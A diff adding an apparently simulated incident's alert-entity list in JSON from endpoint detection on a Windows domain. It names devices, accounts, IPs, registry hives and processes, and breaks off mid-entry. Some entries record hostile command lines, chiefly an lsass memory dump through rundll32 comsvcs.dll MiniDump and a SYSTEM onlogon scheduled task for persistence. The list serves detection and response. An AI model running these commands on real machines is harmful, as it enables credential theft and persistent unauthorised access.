@@ -1,0 +1,850 @@
+[
+  {
+    "type": "device",
+    "name": "perseo.valtaro.local",
+    "alert_ids": [
+      "da04fb149d-4c47-4912-9f87-73700d1771c4_1",
+      "da31b584b3-85ab-4e97-9383-a802ea322832_1"
+    ],
+    "mde_device_id": "209a7ad4ccd2323d9543c2c5c8fff8278ad7dc6e",
+    "os": "WindowsServer2019",
+    "risk_score": "none",
+    "logged_on_users": [
+      "VALTARO\\administrator"
+    ],
+    "first_seen": "2026-09-13T09:33:40.550959Z",
+    "detailed_roles": [
+      "PrimaryDevice"
+    ],
+    "verdict": "suspicious",
+    "remediation_status": "active"
+  },
+  {
+    "type": "process",
+    "name": "WmiPrvSE.exe",
+    "alert_ids": [
+      "da04fb149d-4c47-4912-9f87-73700d1771c4_1",
+      "da31b584b3-85ab-4e97-9383-a802ea322832_1"
+    ],
+    "path": "C:\\Windows\\System32\\wbem",
+    "sha1": "757916a3aa96c93787920469dbae8640fdddf1b0",
+    "sha256": "94980fe1fb380513ea134c57fe9c7ce6252a0540b4ed04d2ef2d284e286fb9c9",
+    "size": 489472,
+    "account": "NT AUTHORITY\\NETWORK SERVICE",
+    "user_sid": "S-1-5-20",
+    "pid": 1372,
+    "parent_pid": 908,
+    "parent_name": "svchost.exe",
+    "created": "2026-09-13T16:34:03.205943Z",
+    "parent_created": "2026-09-13T14:06:02.229547Z",
+    "command_line": "wmiprvse.exe -secured -Embedding",
+    "mde_device_id": "209a7ad4ccd2323d9543c2c5c8fff8278ad7dc6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "perseo.valtaro.local",
+    "instance": "perseo.valtaro.local|1372|2026-09-13T16:34:03.205943Z"
+  },
+  {
+    "type": "device",
+    "name": "ENEA.valtaro.local",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da284d2d91-287d-4c30-8393-405def3d6acf_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1",
+      "da6b5b6369-b19d-4c4c-b486-d7632f54c9e0_1",
+      "da7dc15b90-d5f8-4c34-a430-abb1de228623_1",
+      "da837f0cf6-1c5c-40b8-b921-b86f45e2a81d_1",
+      "daa55db53e-8102-46a7-9d92-ae575e108b51_1",
+      "daa89b9fd0-9b86-4c56-849c-da2daea6427d_1",
+      "daab3c8b89-7c98-4059-882b-59814a5ce1b6_1",
+      "daca181bb3-024c-433d-bc58-abcd90312fbf_1",
+      "daceecba14-35f4-4e04-9eaf-2cc2abf3619a_1",
+      "dadb3ffdd6-5840-49f1-8e6b-088bc4020d4c_1",
+      "dadd192bdf-f977-47c1-bbb7-be4d240213d4_1",
+      "dadfee89ee-3b84-44e6-a039-70a7208f958c_1",
+      "dae1a81685-183b-4e91-94c7-f2d38a72261a_1"
+    ],
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "os": "WindowsServer2016",
+    "risk_score": "informational",
+    "logged_on_users": [
+      "ENEA\\Administrator"
+    ],
+    "first_seen": "2026-09-13T13:58:20.374563Z",
+    "detailed_roles": [
+      "PrimaryDevice"
+    ],
+    "verdict": "suspicious",
+    "remediation_status": "active"
+  },
+  {
+    "type": "user",
+    "name": "administrator@valtaro.local",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da284d2d91-287d-4c30-8393-405def3d6acf_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1",
+      "da385c5af9-5995-4130-91af-60f143e4a648_1",
+      "da5d575314-cc0d-4912-81b3-b5929396fb45_1",
+      "da63f38b67-0e42-46c1-a023-445ac63bffc9_1",
+      "da73875673-95b5-4198-9a78-d8b02b9ec3ef_1",
+      "da7dc15b90-d5f8-4c34-a430-abb1de228623_1",
+      "da837f0cf6-1c5c-40b8-b921-b86f45e2a81d_1",
+      "da8437ff85-5586-49fd-ad73-9eed23026dd9_1",
+      "da84b44b36-6e71-4727-901e-f6cac25b803a_1",
+      "daa89b9fd0-9b86-4c56-849c-da2daea6427d_1",
+      "daab3c8b89-7c98-4059-882b-59814a5ce1b6_1",
+      "daceecba14-35f4-4e04-9eaf-2cc2abf3619a_1",
+      "dadb3ffdd6-5840-49f1-8e6b-088bc4020d4c_1",
+      "dadd192bdf-f977-47c1-bbb7-be4d240213d4_1",
+      "dadfee89ee-3b84-44e6-a039-70a7208f958c_1",
+      "dae1a81685-183b-4e91-94c7-f2d38a72261a_1",
+      "daeb615757-9cb0-42aa-9fef-6d6166c99c61_1",
+      "daf9d39c2e-0538-45cf-8660-7ac28c026732_1"
+    ],
+    "account": "VALTARO\\Administrator",
+    "user_sid": "S-1-5-21-4167694581-1749342574-3371095910-500",
+    "upn": "administrator@valtaro.local",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "devices": [
+      "ACHILLE.valtaro.local",
+      "ENEA.valtaro.local",
+      "ettore.valtaro.local"
+    ]
+  },
+  {
+    "type": "file",
+    "name": "YtPClvxU.tmp",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1"
+    ],
+    "path": "\\Device\\HarddiskVolume2\\Windows\\Temp",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local"
+  },
+  {
+    "type": "ip",
+    "name": "10.6.50.101",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1",
+      "da63f38b67-0e42-46c1-a023-445ac63bffc9_1",
+      "da73875673-95b5-4198-9a78-d8b02b9ec3ef_1",
+      "da8437ff85-5586-49fd-ad73-9eed23026dd9_1",
+      "da84b44b36-6e71-4727-901e-f6cac25b803a_1",
+      "daeb615757-9cb0-42aa-9fef-6d6166c99c61_1",
+      "daf9d39c2e-0538-45cf-8660-7ac28c026732_1"
+    ],
+    "ip": "10.6.50.101",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "devices": [
+      "ACHILLE.valtaro.local",
+      "ENEA.valtaro.local",
+      "ettore.valtaro.local"
+    ]
+  },
+  {
+    "type": "process",
+    "name": "ntoskrnl.exe",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "7320f0ee9c1de827eaa279e66ad7f0d774790e7c",
+    "sha256": "e1508c8fa2ac93948e01941aec8104a3371e855d85fc27f0ecaf2b562d3cc2b2",
+    "size": 7795208,
+    "account": "NT AUTHORITY\\SYSTEM",
+    "user_sid": "S-1-5-18",
+    "pid": 4,
+    "created": "2026-09-13T18:38:19.593669Z",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|4|2026-09-13T18:38:19.593669Z"
+  },
+  {
+    "type": "process",
+    "name": "svchost.exe",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "5d26e3e0269a93ed565702042bc3de7eaff6ebfe",
+    "sha256": "11faeb577faf552be4ff2275195cd0b3471228ee56c25d38de5261bf87df48ba",
+    "size": 46472,
+    "account": "NT AUTHORITY\\LOCAL SERVICE",
+    "user_sid": "S-1-5-19",
+    "pid": 1072,
+    "parent_pid": 640,
+    "parent_name": "services.exe",
+    "created": "2026-09-13T18:39:13.765426Z",
+    "parent_created": "2026-09-13T18:38:51.74649Z",
+    "command_line": "svchost.exe -k LocalService",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|1072|2026-09-13T18:39:13.765426Z"
+  },
+  {
+    "type": "process",
+    "name": "services.exe",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1"
+    ],
+    "path": "\\Device\\HarddiskVolume2\\Windows\\System32",
+    "pid": 640,
+    "created": "2026-09-13T18:38:51.74649Z",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|640|2026-09-13T18:38:51.74649Z"
+  },
+  {
+    "type": "registry",
+    "name": "HKEY_LOCAL_MACHINE\\SECURITY",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1"
+    ],
+    "key": "HKEY_LOCAL_MACHINE\\SECURITY",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "device": "ENEA.valtaro.local"
+  },
+  {
+    "type": "registry",
+    "name": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa:NoLmHash",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1"
+    ],
+    "key": "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa",
+    "value_name": "NoLmHash",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "device": "ENEA.valtaro.local"
+  },
+  {
+    "type": "process",
+    "name": "services.exe",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1",
+      "da6b5b6369-b19d-4c4c-b486-d7632f54c9e0_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "e142072219caeded2c10f52a87460a386075c28d",
+    "sha256": "bf9c7a93e37ad19e8d592eed389e2b31ab68a90a364742a1251c5aa00847a311",
+    "size": 456656,
+    "account": "NT AUTHORITY\\SYSTEM",
+    "user_sid": "S-1-5-18",
+    "pid": 640,
+    "parent_pid": 528,
+    "parent_name": "wininit.exe",
+    "created": "2026-09-13T18:38:51.74649Z",
+    "parent_created": "2026-09-13T18:38:48.267586Z",
+    "command_line": "services.exe",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|640|2026-09-13T18:38:51.74649Z"
+  },
+  {
+    "type": "process",
+    "name": "lsass.exe",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1",
+      "daceecba14-35f4-4e04-9eaf-2cc2abf3619a_1",
+      "dadb3ffdd6-5840-49f1-8e6b-088bc4020d4c_1",
+      "dae1a81685-183b-4e91-94c7-f2d38a72261a_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "5251a997cd7c655df47d2cff1ec898dca489fafe",
+    "sha256": "282f7b24b1dec694c9801fcae7b490bb5de5a088329356ff38afb610c75a34b5",
+    "size": 59080,
+    "account": "NT AUTHORITY\\SYSTEM",
+    "user_sid": "S-1-5-18",
+    "pid": 660,
+    "parent_pid": 528,
+    "parent_name": "wininit.exe",
+    "created": "2026-09-13T18:38:52.882512Z",
+    "parent_created": "2026-09-13T18:38:48.267586Z",
+    "command_line": "lsass.exe",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|660|2026-09-13T18:38:52.882512Z"
+  },
+  {
+    "type": "process",
+    "name": "rundll32.exe",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1",
+      "da837f0cf6-1c5c-40b8-b921-b86f45e2a81d_1",
+      "daceecba14-35f4-4e04-9eaf-2cc2abf3619a_1",
+      "dadb3ffdd6-5840-49f1-8e6b-088bc4020d4c_1",
+      "dae1a81685-183b-4e91-94c7-f2d38a72261a_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "5ecbe863f4be35de1c3deff2c24045aa7769eba7",
+    "sha256": "28de7d3e8bf4b19e44063a4bfc2e7c30ae488cd9a1f63320ed374e14aaeca667",
+    "size": 69632,
+    "account": "VALTARO\\Administrator",
+    "user_sid": "S-1-5-21-4167694581-1749342574-3371095910-500",
+    "upn": "administrator@valtaro.local",
+    "pid": 4940,
+    "parent_pid": 3972,
+    "parent_name": "cmd.exe",
+    "created": "2026-09-13T20:08:22.367592Z",
+    "parent_created": "2026-09-13T20:08:22.356258Z",
+    "command_line": "rundll32.exe  C:\\Windows\\System32\\comsvcs.dll, MiniDump 660 C:\\Windows\\Temp\\l.dmp full",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|4940|2026-09-13T20:08:22.367592Z"
+  },
+  {
+    "type": "file",
+    "name": "UBtZhSda.tmp",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1"
+    ],
+    "path": "\\Device\\HarddiskVolume2\\Windows\\Temp",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local"
+  },
+  {
+    "type": "registry",
+    "name": "HKEY_LOCAL_MACHINE\\SAM",
+    "alert_ids": [
+      "da051bc742-df5f-4c89-8d1a-01226421a831_1",
+      "da185ca017-f486-42de-8820-eef0a603df84_1",
+      "da29627622-f557-4e22-876b-91f91e6eedc8_1"
+    ],
+    "key": "HKEY_LOCAL_MACHINE\\SAM",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "device": "ENEA.valtaro.local"
+  },
+  {
+    "type": "device",
+    "name": "ACHILLE.valtaro.local",
+    "alert_ids": [
+      "da20541b67-04f7-44ea-a0d3-65b66decc899_1",
+      "da385c5af9-5995-4130-91af-60f143e4a648_1",
+      "da6b15251f-e604-4c2d-91a9-5ac334aa4c60_1",
+      "da8437ff85-5586-49fd-ad73-9eed23026dd9_1",
+      "da84b44b36-6e71-4727-901e-f6cac25b803a_1",
+      "daf9d39c2e-0538-45cf-8660-7ac28c026732_1"
+    ],
+    "mde_device_id": "e1ed4865c0bfa2aa2e29c1826974b616c1e2c7f9",
+    "os": "Windows10",
+    "risk_score": "low",
+    "logged_on_users": [
+      "VALTARO\\administrator"
+    ],
+    "first_seen": "2026-09-13T14:22:46.314269Z",
+    "detailed_roles": [
+      "PrimaryDevice"
+    ],
+    "verdict": "suspicious",
+    "remediation_status": "active"
+  },
+  {
+    "type": "process",
+    "name": "WmiPrvSE.exe",
+    "alert_ids": [
+      "da20541b67-04f7-44ea-a0d3-65b66decc899_1",
+      "da6b15251f-e604-4c2d-91a9-5ac334aa4c60_1",
+      "da8437ff85-5586-49fd-ad73-9eed23026dd9_1",
+      "da84b44b36-6e71-4727-901e-f6cac25b803a_1",
+      "daf9d39c2e-0538-45cf-8660-7ac28c026732_1"
+    ],
+    "path": "C:\\Windows\\System32\\wbem",
+    "sha1": "7f530281c5ba86b81ae4230dab1617cb55260d9e",
+    "sha256": "8bbdead7357af7bf0efe397f9fd7e0ec578755eb8bdbaa65ae4f28ef00087ad5",
+    "size": 496640,
+    "account": "NT AUTHORITY\\NETWORK SERVICE",
+    "user_sid": "S-1-5-20",
+    "pid": 10208,
+    "parent_pid": 832,
+    "parent_name": "svchost.exe",
+    "created": "2026-09-13T16:35:29.927437Z",
+    "parent_created": "2026-09-13T12:44:57.359187Z",
+    "command_line": "wmiprvse.exe -secured -Embedding",
+    "mde_device_id": "e1ed4865c0bfa2aa2e29c1826974b616c1e2c7f9",
+    "verdict": "malicious",
+    "remediation_status": "blocked",
+    "detection_status": "blocked",
+    "device": "ACHILLE.valtaro.local",
+    "instance": "ACHILLE.valtaro.local|10208|2026-09-13T16:35:29.927437Z"
+  },
+  {
+    "type": "file",
+    "name": "calc.exe",
+    "alert_ids": [
+      "da284d2d91-287d-4c30-8393-405def3d6acf_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "af54c050078eeb100823f307cea22ad0cacd4116",
+    "sha256": "04fa16d1fbb5f047e7bf9756e8ddc1365afeaab22dd4a2c3f03e067b75bed8ea",
+    "size": 32256,
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local"
+  },
+  {
+    "type": "process",
+    "name": "schtasks.exe",
+    "alert_ids": [
+      "da284d2d91-287d-4c30-8393-405def3d6acf_1",
+      "dadfee89ee-3b84-44e6-a039-70a7208f958c_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "58ecb25b08a24660e71ce411c2c1d8709572abec",
+    "sha256": "a9a4fd9c1bb7c5cf8f77f761cae60f4ac4afb8daeebb46b3ad6983d5e599cdc1",
+    "size": 226816,
+    "account": "VALTARO\\Administrator",
+    "user_sid": "S-1-5-21-4167694581-1749342574-3371095910-500",
+    "upn": "administrator@valtaro.local",
+    "pid": 1892,
+    "parent_pid": 3308,
+    "parent_name": "powershell.exe",
+    "created": "2026-09-13T20:08:29.945256Z",
+    "parent_created": "2026-09-13T20:08:19.698917Z",
+    "command_line": "\"schtasks.exe\" /create /tn ValtaroUpdater /tr C:\\Windows\\System32\\calc.exe /sc onlogon /ru SYSTEM /f",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|1892|2026-09-13T20:08:29.945256Z"
+  },
+  {
+    "type": "device",
+    "name": "ULISSE.valtaro.local",
+    "alert_ids": [
+      "da3a531c37-7794-4ccb-8d91-1ef9b41d2d95_1",
+      "da86d37b90-d1ff-4345-b8f3-24d486fadfb4_1"
+    ],
+    "mde_device_id": "4e7d613d18c001063cc6b3d1356e43890f55bb53",
+    "os": "WindowsServer2019",
+    "risk_score": "none",
+    "logged_on_users": [
+      "VALTARO\\administrator"
+    ],
+    "first_seen": "2026-09-13T14:22:38.716848Z",
+    "detailed_roles": [
+      "PrimaryDevice"
+    ],
+    "verdict": "suspicious",
+    "remediation_status": "active"
+  },
+  {
+    "type": "process",
+    "name": "(unnamed)",
+    "alert_ids": [
+      "da3a531c37-7794-4ccb-8d91-1ef9b41d2d95_1"
+    ],
+    "account": "SYSTEM",
+    "user_sid": "S-1-5-18",
+    "pid": 3132,
+    "created": "2026-09-13T16:33:49.555462Z",
+    "verdict": "malicious",
+    "remediation_status": "blocked",
+    "detection_status": "blocked",
+    "device": "ULISSE.valtaro.local",
+    "instance": "ULISSE.valtaro.local|3132|2026-09-13T16:33:49.555462Z"
+  },
+  {
+    "type": "device",
+    "name": "ettore.valtaro.local",
+    "alert_ids": [
+      "da4c585176-e293-4797-a4da-70b55b1e44dc_1",
+      "da5d575314-cc0d-4912-81b3-b5929396fb45_1",
+      "da63f38b67-0e42-46c1-a023-445ac63bffc9_1",
+      "da73875673-95b5-4198-9a78-d8b02b9ec3ef_1",
+      "da834e0d4c-de79-4697-8224-08e9391430ec_1",
+      "daeb615757-9cb0-42aa-9fef-6d6166c99c61_1"
+    ],
+    "mde_device_id": "ad7d3005326c3e42aac3fc9bb1ce5028d83a587d",
+    "os": "Windows10",
+    "risk_score": "high",
+    "logged_on_users": [
+      "VALTARO\\administrator"
+    ],
+    "first_seen": "2026-09-13T09:20:29.688441Z",
+    "detailed_roles": [
+      "PrimaryDevice"
+    ],
+    "verdict": "suspicious",
+    "remediation_status": "active"
+  },
+  {
+    "type": "process",
+    "name": "WmiPrvSE.exe",
+    "alert_ids": [
+      "da4c585176-e293-4797-a4da-70b55b1e44dc_1",
+      "da63f38b67-0e42-46c1-a023-445ac63bffc9_1",
+      "da73875673-95b5-4198-9a78-d8b02b9ec3ef_1",
+      "da834e0d4c-de79-4697-8224-08e9391430ec_1",
+      "daeb615757-9cb0-42aa-9fef-6d6166c99c61_1"
+    ],
+    "path": "C:\\Windows\\System32\\wbem",
+    "sha1": "7f530281c5ba86b81ae4230dab1617cb55260d9e",
+    "sha256": "8bbdead7357af7bf0efe397f9fd7e0ec578755eb8bdbaa65ae4f28ef00087ad5",
+    "size": 496640,
+    "account": "NT AUTHORITY\\NETWORK SERVICE",
+    "user_sid": "S-1-5-20",
+    "pid": 6852,
+    "parent_pid": 928,
+    "parent_name": "svchost.exe",
+    "created": "2026-09-13T16:35:16.76257Z",
+    "parent_created": "2026-09-13T12:41:08.605862Z",
+    "command_line": "wmiprvse.exe -secured -Embedding",
+    "mde_device_id": "ad7d3005326c3e42aac3fc9bb1ce5028d83a587d",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ettore.valtaro.local",
+    "instance": "ettore.valtaro.local|6852|2026-09-13T16:35:16.76257Z"
+  },
+  {
+    "type": "ip",
+    "name": "10.6.50.33",
+    "alert_ids": [
+      "da63f38b67-0e42-46c1-a023-445ac63bffc9_1",
+      "da73875673-95b5-4198-9a78-d8b02b9ec3ef_1",
+      "daeb615757-9cb0-42aa-9fef-6d6166c99c61_1"
+    ],
+    "ip": "10.6.50.33",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "device": "ettore.valtaro.local"
+  },
+  {
+    "type": "process",
+    "name": "svchost.exe",
+    "alert_ids": [
+      "da63f38b67-0e42-46c1-a023-445ac63bffc9_1",
+      "da73875673-95b5-4198-9a78-d8b02b9ec3ef_1",
+      "daeb615757-9cb0-42aa-9fef-6d6166c99c61_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "bd4068a70beeae18195edbdcd2837f2f43d254e6",
+    "sha256": "b0b36bff7ae4057f687d839cd4b3d81159ab646f1ee1b22106a927e93decbb61",
+    "size": 57480,
+    "account": "NT AUTHORITY\\SYSTEM",
+    "user_sid": "S-1-5-18",
+    "pid": 2304,
+    "parent_pid": 708,
+    "parent_name": "services.exe",
+    "created": "2026-09-13T12:41:18.276611Z",
+    "parent_created": "2026-09-13T12:41:02.521039Z",
+    "command_line": "svchost.exe -k netsvcs -p -s Winmgmt",
+    "mde_device_id": "ad7d3005326c3e42aac3fc9bb1ce5028d83a587d",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ettore.valtaro.local",
+    "instance": "ettore.valtaro.local|2304|2026-09-13T12:41:18.276611Z"
+  },
+  {
+    "type": "process",
+    "name": "sshd.exe",
+    "alert_ids": [
+      "da6b5b6369-b19d-4c4c-b486-d7632f54c9e0_1"
+    ],
+    "path": "C:\\Program Files\\OpenSSH",
+    "sha1": "3a6ac41b715fc4636a3b35435e485958a2893f3b",
+    "sha256": "d66150486d472b8748cae2d6f5078a210dae91621447974bde028f077a4ef90c",
+    "size": 784416,
+    "account": "NT AUTHORITY\\SYSTEM",
+    "user_sid": "S-1-5-18",
+    "pid": 4184,
+    "parent_pid": 640,
+    "parent_name": "services.exe",
+    "created": "2026-09-13T19:16:16.612233Z",
+    "parent_created": "2026-09-13T18:38:51.74649Z",
+    "command_line": "\"sshd.exe\"",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|4184|2026-09-13T19:16:16.612233Z"
+  },
+  {
+    "type": "process",
+    "name": "cmd.exe",
+    "alert_ids": [
+      "da837f0cf6-1c5c-40b8-b921-b86f45e2a81d_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "99ae9c73e9bee6f9c76d6f4093a9882df06832cf",
+    "sha256": "935c1861df1f4018d698e8b65abfa02d7e9037d8f68ca3c2065b6ca165d44ad2",
+    "size": 232960,
+    "account": "VALTARO\\Administrator",
+    "user_sid": "S-1-5-21-4167694581-1749342574-3371095910-500",
+    "upn": "administrator@valtaro.local",
+    "pid": 3972,
+    "parent_pid": 3308,
+    "parent_name": "powershell.exe",
+    "created": "2026-09-13T20:08:22.356258Z",
+    "parent_created": "2026-09-13T20:08:19.698917Z",
+    "command_line": "\"cmd.exe\" /c \"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 660 C:\\Windows\\Temp\\l.dmp full\"",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
+    "instance": "ENEA.valtaro.local|3972|2026-09-13T20:08:22.356258Z"
+  },
+  {
+    "type": "ip",
+    "name": "10.6.50.34",
+    "alert_ids": [
+      "da8437ff85-5586-49fd-ad73-9eed23026dd9_1",
+      "da84b44b36-6e71-4727-901e-f6cac25b803a_1",
+      "daf9d39c2e-0538-45cf-8660-7ac28c026732_1"
+    ],
+    "ip": "10.6.50.34",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "device": "ACHILLE.valtaro.local"
+  },
+  {
+    "type": "process",
+    "name": "svchost.exe",
+    "alert_ids": [
+      "da8437ff85-5586-49fd-ad73-9eed23026dd9_1",
+      "da84b44b36-6e71-4727-901e-f6cac25b803a_1",
+      "daf9d39c2e-0538-45cf-8660-7ac28c026732_1"
+    ],
+    "path": "C:\\Windows\\System32",
+    "sha1": "bd4068a70beeae18195edbdcd2837f2f43d254e6",
+    "sha256": "b0b36bff7ae4057f687d839cd4b3d81159ab646f1ee1b22106a927e93decbb61",
+    "size": 57480,
+    "account": "NT AUTHORITY\\SYSTEM",
+    "user_sid": "S-1-5-18",
+    "pid": 1816,
+    "parent_pid": 692,
+    "parent_name": "services.exe",
+    "created": "2026-09-13T12:45:00.254Z",
+    "parent_created": "2026-09-13T12:44:54.845416Z",
+    "command_line": "svchost.exe -k netsvcs -p -s Winmgmt",
+    "mde_device_id": "e1ed4865c0bfa2aa2e29c1826974b616c1e2c7f9",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ACHILLE.valtaro.local",
+    "instance": "ACHILLE.valtaro.local|1816|2026-09-13T12:45:00.254Z"
+  },
+  {
+    "type": "process",
+    "name": "WmiPrvSE.exe",
+    "alert_ids": [
+      "da86d37b90-d1ff-4345-b8f3-24d486fadfb4_1"
+    ],
+    "path": "C:\\Windows\\System32\\wbem",
+    "sha1": "757916a3aa96c93787920469dbae8640fdddf1b0",
+    "sha256": "94980fe1fb380513ea134c57fe9c7ce6252a0540b4ed04d2ef2d284e286fb9c9",
+    "size": 489472,
+    "account": "NT AUTHORITY\\NETWORK SERVICE",
+    "user_sid": "S-1-5-20",
+    "pid": 3132,
+    "parent_pid": 896,
+    "parent_name": "svchost.exe",
+    "created": "2026-09-13T16:33:49.555462Z",
+    "parent_created": "2026-09-13T12:41:57.01742Z",
+    "command_line": "wmiprvse.exe -secured -Embedding",
+    "mde_device_id": "4e7d613d18c001063cc6b3d1356e43890f55bb53",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ULISSE.valtaro.local",
+    "instance": "ULISSE.valtaro.local|3132|2026-09-13T16:33:49.555462Z"
+  },
+  {
+    "type": "process",
+    "name": "WmiPrvSE.exe",
+    "alert_ids": [
+      "daa55db53e-8102-46a7-9d92-ae575e108b51_1",
+      "daca181bb3-024c-433d-bc58-abcd90312fbf_1"
+    ],
+    "path": "C:\\Windows\\System32\\wbem",
+    "sha1": "57c833dccf890b8ad092e74a1a730badee39e79d",
+    "sha256": "1d7b11c9deddad4f77e5b7f01dddda04f3747e512e0aa23d39e4226854d26ca2",
+    "size": 494592,
+    "account": "NT AUTHORITY\\NETWORK SERVICE",
+    "user_sid": "S-1-5-20",
+    "pid": 4944,
+    "parent_pid": 700,
+    "parent_name": "svchost.exe",
+    "created": "2026-09-13T16:03:40.405215Z",
+    "parent_created": "2026-09-13T15:02:09.613368Z",
+    "command_line": "wmiprvse.exe -secured -Embedding",
+    "mde_device_id": "38a9587a2b7cab0261920254bd9adf2289a34d6e",
+    "verdict": "suspicious",
+    "remediation_status": "active",
+    "detection_status": "detected",
+    "device": "ENEA.valtaro.local",
